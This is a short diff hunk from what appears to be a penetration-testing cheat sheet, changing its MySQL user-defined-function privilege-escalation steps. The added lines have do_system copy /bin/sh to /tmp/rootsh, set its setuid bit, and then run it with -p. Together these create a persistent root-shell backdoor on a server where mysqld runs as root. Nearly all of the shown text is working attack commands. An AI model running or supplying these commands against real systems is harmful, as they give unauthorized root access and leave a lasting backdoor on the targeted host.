@@ -2466,10 +2466,10 @@ find /usr -name "*.so" |grep name_here
 ## check import
 select * from mysql.func;
 ## priv esc to root (if mysqld runs as root!)
-select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
+select do_system('cp /bin/sh /tmp/rootsh && chmod +s /tmp/rootsh');
 ## spawn root shell
 \! sh
-\! bash
+/tmp/rootsh -p
 
 # get mysql version
 mysqld --version
